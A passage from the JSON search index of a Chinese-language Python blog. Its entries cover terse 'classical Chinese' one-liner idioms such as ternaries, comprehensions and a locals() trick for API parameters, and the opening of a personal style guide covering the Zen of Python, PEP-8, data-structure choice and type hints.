...\n</code></pre>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#4-if-else-if-else","title":"4. \u5c06 <code>if-else</code> \u5757\u6539\u4e3a <code>if-else</code> \u4e09\u76ee\u8fd0\u7b97\u7b26\uff08\u4f2a\uff09","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>if a &gt; 0:\n    b = 1\nelse:\n    b = -1\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>b = 1 if a &gt; 0 else -1\n</code></pre> <p>\u8fd9\u4e2a\u5f88\u591a\u4eba\u5e94\u8be5\u90fd\u77e5\u9053\uff0c\u5c31\u4e0d\u8d58\u8ff0\u4e86\u3002</p> <p>\u8fd9\u548c\u4e09\u76ee\u8fd0\u7b97\u7b26\u6709\u70b9\u76f8\u4f3c\uff1a</p> <pre><code>b = a &gt; 0 ? 1 : -1\n</code></pre>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#5-if-else","title":"5. \u5229\u7528 <code>if-else</code> \u4e09\u76ee\u8fd0\u7b97\u7b26\u5904\u7406\u5e8f\u5217","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>msg = 'the fox jumped over the lazy dog'\nnew_msg = ''\n\nfor char in msg:\n    if char == ' ':\n        new_msg += ' '\n    else:\n        # \u51ef\u6492\u5bc6\u7801\n        new_msg += chr((ord(char) - ord('a') + 1) % 26 + ord('a'))\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>msg = 'the quick brown fox jumps over the lazy dog'\nnew_msg = ''.join(' ' if char == ' ' else chr((ord(char) - ord('a') + 1) % 26 + ord('a')) for char in msg)\n</code></pre> <p>\u4e3a\u4e86\u53d9\u8ff0\u65b9\u4fbf\uff0c\u6211\u4eec\u628a\u6587\u8a00\u6587\u91cc\u51fa\u73b0\u7684 <code>chr((ord(char) - ord('a') + 1) % 26 + ord('a'))</code> \u8fd9\u4e2a\u8868\u8fbe\u5f0f\u79f0\u4e3a <code>caesar(char)</code>\uff0c\u5373\uff1a</p> <pre><code>msg = 'the quick brown fox jumps over the lazy dog'\nnew_msg = ''.join(' ' if char == ' ' else caesar(char) for char in msg)\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u628a <code>' ' if char == ' ' else caesar(char)</code> \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\uff0c\u800c\u4e0d\u662f\u628a <code>caesar(char) for char in msg</code> \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u6700\u7ec8\u662f\u4e00\u4e2a\u751f\u6210\u5668\uff08\u7531 <code>for-in</code> \u8bed\u53e5\u5236\u9020\uff09\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff08<code>if-else</code> \u4e09\u76ee\u8fd0\u7b97\u7b26\uff09\u3002</p> <p>\u53e6\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5229\u7528 <code>map()</code> \u51fd\u6570\u548c <code>lambda</code> \u8868\u8fbe\u5f0f\u5199\u6210\u4ee5\u4e0b\u7684\u5f62\u5f0f\uff1a</p> <pre><code>new_msg = ''.join(map(lambda char: ' ' if char == ' ' else caesar(char), msg))\n</code></pre>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#6-inline","title":"6. \u5229\u7528 inline \u5faa\u73af\u79fb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>ls = [1, 1, 1, 2, 2, 3]\nwhile 1 in ls:\n    ls.remove(1)\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>ls = [1, 1, 1, 2, 2, 3]\nls = [item for item in ls if item != 1]\n</code></pre> <p>\u6709\u6ca1\u6709\u611f\u5174\u8da3\u7684\u540c\u5b66\u6765\u4e00\u6ce2\u6027\u80fd\u5206\u6790\uff1f</p>","tags":["python"]},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#7-locals-api","title":"7. \u4f7f\u7528 <code>locals()</code> \u53d6\u4ee3 API \u8bf7\u6c42\u53c2\u6570\u5217\u8868","text":"<p>\u73b0\u4ee3\u6587\uff1a</p> <pre><code>async def user_best(user, usercode, songname, songid, difficulty, withrecent, withsonginfo) -&gt; dict:\n\n    user_best_params = dict(\n        user=user,\n        usercode=usercode,\n        songname=songname,\n        songid=songid,\n        difficulty=difficulty,\n        withrecent=withrecent,\n        withsonginfo=withsonginfo,\n    )\n\n    return await _request(Endpoint.V1.User.best, user_best_params)\n</code></pre> <p>\u6587\u8a00\u6587\uff1a</p> <pre><code>async def user_best(user, usercode, songname, songid, difficulty, withrecent, withsonginfo) -&gt; dict: return await _request(Endpoint.V1.User.best, locals())\n</code></pre> <p>\u8fd9\u6837\u7684\u597d\u5904\u4e0d\u8a00\u800c\u55bb\u2014\u2014\u4e0d\u7528\u6bcf\u6b21\u5199 API \u51fd\u6570\u90fd\u8981\u590d\u8bfb\u4e00\u904d\u53c2\u6570\u5217\u8868\u3002\u751a\u81f3\u975e\u5e38\u7b80\u6d01\u2014\u2014\u53ef\u4ee5\u4e00\u884c\u5199\u5b8c\u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>\u4f46\u662f\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff1a\u5728\u8c03\u7528 <code>locals()</code> \u51fd\u6570\u4e4b\u524d\uff0c\u8be5\u51fd\u6570\u5185\u90e8\u4e0d\u80fd\u5b9a\u4e49\u4efb\u4f55\u53d8\u91cf\uff0c\u5426\u5219\u8fd9\u4e2a\u65b0\u53d8\u91cf\u5c06\u52a0\u5165 API \u7684\u53c2\u6570\u5217\u8868\u3002</p> <p>\u9898\u5916\u8bdd</p> <p>\u82e5\u8003\u8651\u4f20\u9012\u7ed9 API \u7684\u53c2\u6570\u53ef\u80fd\u4e3a <code>None</code> \u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5fc5\u987b\u5728 <code>_request()</code> \u51fd\u6570\u4e2d\u6e05\u7406\u8fd9\u4e9b <code>None</code>\uff0c\u5982\u4e0b\uff1a</p> <pre><code>clear_params = {k: v for k, v in params.items() if v is not None}\n</code></pre> <p>\u751a\u81f3\u53ef\u4ee5\u5c06\u5176\u5305\u88c5\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684 <code>set_params()</code> \u51fd\u6570\uff1a</p> <pre><code>def set_params(**kwargs): return {k: v for k, v in kwargs.items() if v is not None}\n</code></pre> <p>\u65e0\u8bba\u662f\u6587\u8a00\u6587\u7248\u672c\u8fd8\u662f\u73b0\u4ee3\u6587\u7248\u672c\uff0c\u8fd9\u90fd\u662f\u4e0d\u53ef\u907f\u514d\u7684\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/","title":"Python \u4e2a\u4eba\u4ee3\u7801\u98ce\u683c\u6307\u5bfc","text":"<p>\u6458\u8981</p> <p>\u8fd9\u662f\u4e00\u7bc7\u7b80\u8981\u7684 Python \u4ee3\u7801\u98ce\u683c\u6307\u5bfc\uff0c\u4ee3\u8868\u4e86\u6211\u4e2a\u4eba\u6240\u503e\u5411\u7684\u4ee3\u7801\u98ce\u683c\u3002\u4f7f\u7528\u8fd9\u4e9b\u98ce\u683c\u53ef\u4ee5\u8ba9\u4f60\u7684\u4ee3\u7801\u770b\u8d77\u6765\u66f4 Pythonic\uff0c\u66f4\u7cbe\u70bc\u5730\u63cf\u8ff0\u4f60\u4ee3\u7801\u6240\u4f5c\u7684\u5de5\u4f5c\uff0c\u6216\u8bb8\u4e5f\u53ef\u4ee5\u51cf\u8f7b\u4f60\u7684\u91cd\u6784\u538b\u529b\u3002</p> <p>\u6bcf\u4e2a\u4eba\u7684\u98ce\u683c\u53ef\u80fd\u5927\u540c\u5c0f\u5f02\uff0c\u4e5f\u6709\u53ef\u80fd\u5927\u76f8\u5f84\u5ead\uff0c\u5199\u5728\u8fd9\u91cc\u5e76\u4e0d\u4ee3\u8868\u6211\u7684\u5c31\u662f\u6700\u597d\u7684\u3002\u6211\u6240\u5e0c\u671b\u7684\u662f\uff0c\u8bfb\u8005\u9605\u8bfb\u5b8c\u6b64\u7bc7\u6587\u7ae0\u540e\u80fd\u591f\u6709\u6240\u542f\u53d1\uff0c\u6216\u662f\u53d1\u73b0\u81ea\u5df1\u4ece\u672a\u4f7f\u7528\u8fc7\u7684\u4f18\u96c5\u65b9\u6cd5\uff0c\u6216\u662f\u6539\u5584\u81ea\u5df1\u4ece\u672a\u610f\u8bc6\u5230\u7684\u4e11\u964b\u5199\u6cd5\uff0c\u5982\u6b64\u4e00\u6765\u6211\u5c31\u5df2\u7ecf\u5f88\u6ee1\u8db3\u4e86\u3002</p> <p>\u8fd9\u91cc\u9762\u7684\u5f88\u591a\u793a\u4f8b\u4ee3\u7801\uff08\u5305\u62ec\u574f\u4ee3\u7801\uff09\u6765\u6e90\u4e8e\u6211\u4fee\u6539\u81ea\u5df1\u7684\u4ee3\u7801\u800c\u5f97\u51fa\u7684\u7ecf\u9a8c\u4e0e\u98ce\u683c\uff0c\u6211\u4e5f\u6b63\u662f\u5728\u4fee\u6539\u5e76\u7f8e\u5316\u8fd9\u4e9b\u4ee3\u7801\u7684\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u4e86\u5199\u8fd9\u4e48\u4e00\u7bc7\u6587\u7ae0\u7684\u60f3\u6cd5\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#_1","title":"\u4e00\u3001\u7eea\u8bba","text":"","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#11-python-import-this","title":"1.1 Python \u4e4b\u7985\uff1a<code>import this</code>","text":"<p>Python\u4e4b\u7985\u6700\u65e9\u7531 Tim Peters \u5728 Python \u90ae\u4ef6\u5217\u8868 \u4e2d\u53d1\u8868\uff0c\u5b83\u5305\u542b\u4e86\u5f71\u54cd Python \u7f16\u7a0b\u8bed\u8a00\u8bbe\u8ba1\u768419\u6761\u8f6f\u4ef6\u7f16\u5199\u539f\u5219\u3002</p> <pre><code>import this\n</code></pre> \u82f1\u6587\u7248 \ud83c\uddec\ud83c\udde7\u4e2d\u6587\u7248 \ud83c\udde8\ud83c\uddf3 <pre><code>Beautiful is better than ugly.\nExplicit is better than implicit.\nSimple is better than complex.\nComplex is better than complicated.\nFlat is better than nested.\nSparse is better than dense.\nReadability counts.\nSpecial cases aren't special enough to break the rules.\nAlthough practicality beats purity.\nErrors should never pass silently.\nUnless explicitly silenced.\nIn the face of ambiguity, refuse the temptation to guess.\nThere should be one-- and preferably only one --obvious way to do it.\nAlthough that way may not be obvious at first unless you're Dutch.\nNow is better than never.\nAlthough never is often better than *right* now.\nIf the implementation is hard to explain, it's a bad idea.\nIf the implementation is easy to explain, it may be a good idea.\nNamespaces are one honking great idea -- let's do more of those!\n</code></pre> <pre><code>\u4f18\u7f8e\u4f18\u4e8e\u4e11\u964b\n\u660e\u4e86\u4f18\u4e8e\u9690\u6666\n\u7b80\u5355\u4f18\u4e8e\u590d\u6742\n\u590d\u6742\u4f18\u4e8e\u7e41\u6742\n\u6241\u5e73\u4f18\u4e8e\u5d4c\u5957\n\u7a00\u758f\u4f18\u4e8e\u7a20\u5bc6\n\u53ef\u8bfb\u6027\u5f88\u91cd\u8981\n\u7279\u4f8b\u4ea6\u4e0d\u53ef\u8fdd\u80cc\u539f\u5219\n\u5373\u4f7f\u5b9e\u7528\u6bd4\u7eaf\u7cb9\u66f4\u4f18\n\u9519\u8bef\u7edd\u4e0d\u80fd\u6084\u6084\u5ffd\u7565\n\u9664\u975e\u5b83\u660e\u786e\u9700\u8981\u5982\u6b64\n\u9762\u5bf9\u4e0d\u786e\u5b9a\u6027\uff0c\u62d2\u7edd\u5984\u52a0\u731c\u6d4b\n\u4efb\u4f55\u95ee\u9898\u5e94\u6709\u4e00\u79cd\uff0c\u4e14\u6700\u597d\u53ea\u6709\u4e00\u79cd\uff0c\u663e\u800c\u6613\u89c1\u7684\u89e3\u51b3\u65b9\u6cd5\n\u5c3d\u7ba1\u8fd9\u65b9\u6cd5\u4e00\u5f00\u59cb\u5e76\u975e\u5982\u6b64\u76f4\u89c2\uff08\u9664\u975e\u4f60\u662f\u8377\u5170\u4eba\uff09\n\u505a\u4f18\u4e8e\u4e0d\u505a\n\u7136\u800c\u4e0d\u5047\u601d\u7d22\u8fd8\u4e0d\u5982\u4e0d\u505a\n\u5f88\u96be\u89e3\u91ca\u7684\uff0c\u5fc5\u7136\u662f\u574f\u65b9\u6cd5\n\u5f88\u597d\u89e3\u91ca\u7684\uff0c\u53ef\u80fd\u662f\u597d\u65b9\u6cd5\n\u547d\u540d\u7a7a\u95f4\u662f\u4e2a\u7edd\u5999\u7684\u4e3b\u610f\uff0c\u6211\u4eec\u5e94\u597d\u597d\u5229\u7528\u5b83\n</code></pre>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#12-pep-8","title":"1.2 PEP-8","text":"<p>PEP-8 \u5168\u79f0 <code>PEP 8 \u2013 Style Guide for Python Code</code>\uff0c\u5b83\u7ed9\u51fa\u4e86\u6784\u6210 Python \u4e3b\u53d1\u884c\u7248\u4e2d\u6807\u51c6\u5e93\u7684 Python \u4ee3\u7801\u7684\u7f16\u7801\u89c4\u8303\u3002</p> <p>\u9075\u5b88 PEP-8 \u662f\u4e00\u4e2a\u5f88\u597d\u7684\u4e60\u60ef\uff0c\u5b83\u5e76\u4e0d\u662f\u4e00\u4e2a\u5fc5\u8981\u7684\u89c4\u8303\u3002PEP-8 \u53ef\u4ee5\u8ba9\u4f60\u7684\u4ee3\u7801\u770b\u8d77\u6765\u66f4\u89c4\u8303\uff0c\u66f4\u7b80\u6d01\uff0c\u66f4\u6613\u8bfb\u3002\u5c24\u5176\u662f\u7edf\u4e00\u7684\u683c\u5f0f\uff0c\u66f4\u5bb9\u6613\u88ab\u4eba\u9605\u8bfb\u3002</p> <p>\u4e00\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88 PEP-8 \u7684\u60c5\u51b5\u3002\u9664\u6b64\u4ee5\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6765\u68c0\u67e5\u4f60\u7684\u4ee3\u7801\u662f\u5426\u9075\u5b88\u4e86 PEP-8 \u89c4\u8303\uff1a</p> <pre><code>python -m pep8 --statistics my_file.py\n</code></pre> <p>\u4e60\u60ef\u6027\u9075\u5b88 PEP-8 \u53ef\u80fd\u4f1a\u8ba9\u60a8\u53d8\u6210 PEP-8 \u7684\u53d7\u5bb3\u8005\uff0c\u5bfc\u81f4\u60a8\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u65f6\u4ecd\u7136\u4fdd\u7559\u4e86 PEP-8 \u4e2d\u7684\u4e60\u60ef\uff0c\u5c3d\u7ba1\u8fd9\u4e9b\u8bed\u8a00\u4e2d\u5e76\u6ca1\u6709\u7c7b\u4f3c\u7684\u8981\u6c42\u3002</p> <p>\u4f46\u8bf7\u6ce8\u610f\uff0cPEP-8 \u5e76\u4e0d\u662f\u6559\u6761\uff0c\u5b83\u4e0d\u662f\u4e00\u4e2a\u4f60\u5fc5\u987b\u9075\u5b88\u7684\u8bed\u6cd5\u89c4\u5219\u3002\u6b63\u5982 PEP-8 \u4e2d\u6240\u8ff0\uff1a</p> <p>\u5f15\u7528</p> <p>However, know when to be inconsistent \u2013 sometimes style guide recommendations just aren\u2019t applicable. When in doubt, use your best judgment. Look at other examples and decide what looks best.</p> <p>\u7136\u800c\u6709\u65f6 PEP-8 \u786e\u5b9e\u4e0d\u9002\u7528\uff0c\u56e0\u6b64\u4f60\u5f97\u77e5\u9053\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4e0e PEP-8 \u4e0d\u4e00\u81f4\u3002\u6bcf\u5f53\u6709\u7591\u95ee\u65f6\uff0c\u8bf7\u76f8\u4fe1\u81ea\u5df1\u7684\u6700\u4f73\u5224\u65ad\uff0c\u6216\u8005\u770b\u770b\u5176\u4ed6\u7684\u4f8b\u5b50\u6765\u51b3\u5b9a\u54ea\u4e00\u4e2a\u770b\u8d77\u6765\u6700\u597d\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4e0d\u9002\u7528\u5462\uff1f</p> <p>PEP-8 \u4e0d\u9002\u7528\u7684\u60c5\u5f62</p> <ul> <li>\u5e94\u7528 PEP-8 \u4f1a\u964d\u4f4e\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\uff08\u4f8b\u5982\u957f\u7684 URL \u53ef\u4ee5\u65e0\u9700\u6362\u884c\uff09</li> <li>\u4e3a\u4e86\u4f7f\u4e0a\u4e0b\u4ee3\u7801\u98ce\u683c\u4e00\u81f4\u800c\u4e0d\u5f97\u4e0d\u8fdd\u80cc PEP-8\uff08\u5c3d\u7ba1\u8fd9\u4e5f\u662f\u4e00\u4e2a\u6e05\u7406\u522b\u4eba\u7684\u70c2\u644a\u5b50\u7684\u673a\u4f1a\uff09</li> <li>\u4ee3\u7801\u5199\u4e8e PEP-8 \u5f15\u5165\u4e4b\u524d\uff0c\u5e76\u4e14\u786e\u5b9e\u6ca1\u6709\u4fee\u6539\u8be5\u4ee3\u7801\u7684\u5fc5\u8981\uff08\u6ce8\uff1aPEP-8 \u53d1\u5e03\u4e8e 2001 \u5e74\uff0c\u5b83\u53ef\u80fd\u6bd4\u4f60\u7684\u5e74\u9f84\u8fd8\u5927\uff09</li> <li>\u4ee3\u7801\u9700\u8981\u4e0e\u65e7\u7248\u672c\u7684 Python \u4fdd\u6301\u517c\u5bb9\uff0c\u4f46\u65e7\u7248\u672c\u7684 Python \u4e0d\u652f\u6301 PEP-8 \u4e2d\u7684\u67d0\u4e9b\u505a\u6cd5\uff08\u771f\u6ca1\u89c1\u8fc7\uff09</li> </ul>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#_2","title":"\u4e8c\u3001\u8be5\u4f7f\u7528\u4ec0\u4e48","text":"","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#21","title":"2.1 \u4f7f\u7528\u5408\u9002\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784","text":"<p>Python \u4e2d\u6709\u591a\u79cd\u5bf9\u8c61\u2014\u2014\u5217\u8868\u3001\u5b57\u5178\u3001\u96c6\u5408\u3001\u5143\u7ec4\u548c\u5b57\u7b26\u4e32\uff0c\u4ee5\u4e0b\u662f\u5bf9\u6bd4\uff1a</p> \u5143\u7d20\u53ef\u91cd\u590d \u5143\u7d20\u53ef\u8ffd\u52a0 \u5bf9\u8c61\u53ef\u54c8\u5e0c \u5143\u7d20\u53ef\u7d22\u5f15 \u5217\u8868 \ud83d\udfe2 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \u5b57\u5178 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u96c6\u5408 \ud83d\udd34 \ud83d\udfe2 \ud83d\udd34 \ud83d\udd34 \u5143\u7ec4 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 \u5b57\u7b26\u4e32 \ud83d\udfe2 \ud83d\udd34 \ud83d\udfe2 \ud83d\udfe2 <p>\u6ce8\uff1a</p> <ol> <li>\u5b57\u5178\u7684\u4e0d\u53ef\u91cd\u590d\u6307\u7684\u662f\uff0c\u5b57\u5178\u4e2d\u7684\u952e\u4e0d\u80fd\u91cd\u590d\u3002</li> <li>\u662f\u5426\u53ef\u8ffd\u52a0\u7684\u6807\u51c6\u662f\uff0c\u9996\u5148\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u8ffd\u52a0\u65b0\u5143\u7d20\uff0c\u5176\u6b21\u5728\u8ffd\u52a0\u524d\u540e\uff0c\u4f7f\u7528 <code>id()</code> \u51fd\u6570\u8ba1\u7b97\u51fa\u7684\u6307\u9488\u662f\u5426\u4e00\u81f4\uff08\u5373\u662f\u5426\u4ecd\u4e3a\u540c\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>hash()</code> \u51fd\u6570\u6216\u662f <code>__hash__()</code> \u9b54\u6cd5\u65b9\u6cd5\u7684\u5bf9\u8c61\u89c6\u4e3a\u53ef\u54c8\u5e0c\u3002</li> <li>\u7531\u4e8e\u6240\u6709\u7684\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u4e0a\u97625\u4e2a\u90fd\u662f\uff09\u90fd\u53ef\u4ee5\u4f7f\u7528 <code>sorted()</code> \u51fd\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u91c7\u7528\u8fd9\u4e2a\u6807\u51c6\u6765\u8fdb\u884c\u6bd4\u8f83\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u6240\u4ee5\u4e0d\u91c7\u7528\u5143\u7d20\u662f\u5426\u6709\u5e8f\u4f5c\u4e3a\u8fd95\u4e2a\u5bf9\u8c61\u7684\u5bf9\u6bd4\u9879\u76ee\u3002</li> <li>\u5143\u7d20\u53ef\u7d22\u5f15\u6307\u7684\u662f\u5bf9\u8c61\u4e2d\u7684\u5143\u7d20\u662f\u5426\u53ef\u4ee5\u6309\u987a\u5e8f\u7d22\u5f15\uff08\u6216\u8005\u8bf4\u662f\u5426\u5177\u6709\u7c7b\u4f3c\u7ebf\u6027\u8868\u4e00\u6837\u7684\u5b58\u50a8\u7ed3\u6784\uff09\uff0c\u800c\u4e0d\u662f\u6307\u8be5\u5bf9\u8c61\u662f\u5426\u5177\u6709 <code>__setitem__()</code> \u9b54\u6cd5\u65b9\u6cd5\u3002</li> </ol> <p>\u9664\u5b57\u7b26\u4e32\u5916\uff0c\u5176\u4f594\u4e2a\u901a\u5e38\u7528\u4e8e\u8868\u793a\u4e00\u7ec4\u6570\u636e\uff08\u6216\u6620\u5c04\uff0c\u4f8b\u5982\u5b57\u5178\uff09\u3002\u4ee5\u4e0b\u662f\u6211\u603b\u7ed3\u7684\u5728\u4ec0\u4e48\u65f6\u5019\u4f7f\u7528\u4ec0\u4e48\u6837\u7684\u6570\u636e\u7ed3\u6784\uff1a</p> \u5217\u8868\uff08<code>list</code>\uff09-&gt; \u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7684\u6700\u4f73\u9009\u62e9 \u4f60\u7684\u6570\u636e\u662f\u6309\u987a\u5e8f\u7d22\u5f15\u7684\uff0c\u5e76\u4e14\u9700\u8981\u9891\u7e41\u5730\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\uff08\u6362\u53e5\u80fd\u542c\u61c2\u7684\u4eba\u8bdd\uff1a\u94fe\u8868\uff09 \u5b57\u5178\uff08<code>dict</code>\uff09 \u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u7c7b\u4f3c\u54c8\u5e0c\u8868\uff08\u6563\u5217\u8868\uff09\u7684\u6570\u636e\u7ed3\u6784\u3002 \u96c6\u5408\uff08<code>set</code>\uff09 \u4f60\u7684\u6570\u636e\u9700\u8981\u9891\u7e41\u5730\u8ffd\u52a0\u3001\u5220\u9664\uff0c\u5e76\u4e14\u4f60\u786e\u4fe1\u4f60\u53ef\u80fd\u4f1a\u8ffd\u52a0\u76f8\u540c\u7684\u6570\u636e\uff0c\u800c\u8fd9\u662f\u4f60\u60f3\u8981\u907f\u514d\u7684\uff08<code>set</code> \u4f1a\u81ea\u52a8\u5ffd\u7565\u8ffd\u52a0\u7684\u91cd\u590d\u5143\u7d20\uff09\u3002 \u5143\u7ec4\uff08<code>tuple</code>\uff09 \u4f60\u7684\u6570\u636e\u53ea\u9700\u8981\u5b9a\u4e49\u4e00\u6b21\uff0c\u5e76\u4e14\u4ece\u4e0d\u4fee\u6539\u3001\u8ffd\u52a0\u3001\u5220\u9664\u3002\u6216\u8005\u5f53\u4f60\u7684\u6570\u636e\u603b\u662f\u7ec4\u961f\u51fa\u73b0\u65f6\uff08\u4f8b\u5982\u5750\u6807\u3001TCP \u56db\u5143\u7ec4\uff09\u3002 <p>\u53ef\u80fd\u6b64\u65f6\u67d0\u4e9b\u4eba\u770b\u5b8c\u4f1a\u94bb\u725b\u89d2\u5c16\uff0c\u975e\u5f97\u6401\u8fd9\u7ea0\u7ed3\u4ec0\u4e48\u94fe\u8868\u548c\u6570\u7ec4\u6027\u80fd\u5dee\u5f02\u548c\u5b9e\u73b0\u4e0a\u7684\u4e0d\u540c\uff0c\u6211\u5df2\u7ecf\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u548c\u7ebf\u6027\u8868\u8fd9\u7c7b\u4e1c\u897f\u4f5c\u6bd4\u8f83\u4ec5\u4ec5\u662f\u4e3a\u4e86\u6253\u6bd4\u65b9\u3002\u4f60\u8981\u8fd9\u4e48\u7ea0\u7ed3\u4f60\u5c31\u53bb\u7528 <code>np.ndarray</code>\uff0c\u6216\u8005\u5e72\u8106\u522b\u7528 Python \u4e86\uff0c\u76f4\u63a5\u53bb\u7528\u4f60\u5fc3\u7231\u7684 C/C++\uff0c\u800c\u4e0d\u7528\u5728\u8fd9\u7ea0\u7ed3 Python \u7684\u51e0\u4e2a\u5bf9\u8c61\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#22","title":"2.2 \u79ef\u6781\u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca","text":"<p>\u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca\u53ef\u4ee5\u8ba9\u4f60\u7684 IDE \u548c\u5176\u4ed6\u5f00\u53d1\u8005\u66f4\u597d\u5730\u9605\u8bfb\u4f60\u7684\u4ee3\u7801\uff0c\u5e76\u4e14\u5728\u540e\u671f\u7684\u91cd\u6784\u65f6\uff0c\u80fd\u66f4\u5927\u80c6\u5730\u8fdb\u884c\u4ee3\u7801\u590d\u7528\uff0c\u800c\u65e0\u987b\u7ea0\u7ed3\u53c2\u6570\u7684\u7c7b\u578b\u3002</p> <p>Example</p> <p>Good: <pre><code>def foo(x: int, y: int) -&gt; int:\n    return x + y\n</code></pre></p> <p>Bad: <pre><code>def foo(x, y):\n    return x + y\n</code></pre></p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>typing</code> \u6807\u51c6\u5e93\u6765\u7f16\u5199\u66f4\u9ad8\u7ea7\u7684\u7c7b\u578b\u6ce8\u91ca\uff0c\u4f8b\u5982\uff1a</p> <p>Example</p> <pre><code>from typing import TypeVar, Union\n\nRealNumeric = TypeVar('RealNumeric', int, float)\n\ndef create_complex(re: RealNumeric = 0, im: RealNumeric = 0) -&gt; Union[RealNumeric, complex]:\n    return re + im * 1j\n</code></pre> <p>\u751a\u81f3\u4f7f\u7528\u6cdb\u578b\uff1a</p> <p>Example</p> <pre><code>from typing import TypeVar\n\n_T = TypeVar('_T')\n\ndef if_pattern(pattern: list[tuple[bool, _T]]) -&gt; _T:\n    return filter(lambda x: x[0], pattern).__next__()[1]\n</code></pre>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#23","title":"2.3 \u51fd\u6570\u7684\u529f\u80fd\u5e94\u5177\u6709\u4e13\u4e00\u6027","text":"<p>\u5e94\u907f\u514d\u540c\u4e00\u4e2a\u51fd\u6570\u6709\u591a\u4e2a\u529f\u80fd\uff08\u6216\u8fd4\u56de\u503c\uff09\uff0c\u4f8b\u5982\uff1a</p> <p>Example</p> <p>Ugly: <pre><code>def calc(const: Optional[float], rating: Optional[float], score: Optional[float]) -&gt; float:\n    if const is None:\n        result = ...  # calc the const\n    if rating is None:\n        result = ...  # calc the rating\n    if score is None:\n        result = ...  # calc the score\n    else:\n        raise ValueError('Invalid input!')\n    return result\n</code></pre></p> <p>\u8bf7\u6ce8\u610f\uff0c\u8fd9\u662f\u6211\u66fe\u7ecf\u7528\u4e8e\u8ba1\u7b97\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u4e00\u4e9b\u6570\u503c\u65f6\u91c7\u7528\u7684\u51fd\u6570\u5199\u6cd5\uff0c\u73b0\u5728\u6211\u89c9\u5f97\u5b83\u5947\u4e11\u65e0\u6bd4\u3002</p>","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#_3","title":"\u4e09\u3001\u8be5\u53d6\u4ee3\u4ec0\u4e48","text":"","tags":["python"]},{"location":"blog/2022/220529-python-personal-styleguide/#31","title":"3.1 \u4f7f\u7528\u4f18\u7f8e\u7684\u73b0\u6709\u65b9\u6cd5\u53d6\u4ee3\u4e11\u964b\u7684\u81ea\u884c\u5b9e\u73b0","text":"<p>\u4ee5\u5224\u65ad\u5b57\u5178\u4e2d\u662f\u5426\u6709\u67d0\u4e2a\u952e\u7684\u65b9\u6cd5\u4e3a\u4f8b\uff1a</p> <p>Example</p> <p>Good:</p> <pre><code>if 'some_key' in d:\n    ...\n</code></pre> <p>Bad:</p> <pre><code>if d.__contains__('some_key'):\n    ...\n\nif d.has_key('some_key'):\n    ...\n</code></pre> <p>\u5e76\u4e14\u8bf7\u6ce8\u610f\uff1a\u4e8b\u5b9e\u4e0a\uff0c<code>dict</code> \u7c7b\u7684 <code>has_key()</code> \u65b9\u6cd5\u5df2\u7ecf \u5728 